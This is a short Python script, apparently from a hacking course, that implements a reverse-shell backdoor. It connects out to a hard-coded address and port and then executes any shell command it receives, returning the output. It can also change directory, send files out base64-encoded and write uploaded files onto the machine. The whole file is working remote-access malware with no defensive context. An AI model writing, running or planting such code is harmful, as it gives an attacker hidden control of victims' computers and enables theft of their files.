#!/usr/bin/python
import socket
import subprocess
import json
import os
import base64
def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        data=""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue


def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			continue
		elif command =="exit":
			break
		elif command[:2] == "cd" and len(command) >1:
			try:
				os.chdir(command[3:])
			except:
		
				continue
		elif command[:7] =="sendall":
			subprocess.Popen(command[8:],shell =True)
		elif command[:8] == "download":
			with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] =="upload":
			with open(command[7:],"wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))
		else :
			proc = subprocess.Popen(command,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("192.168.43.47",54321))

shell()
sock.close()


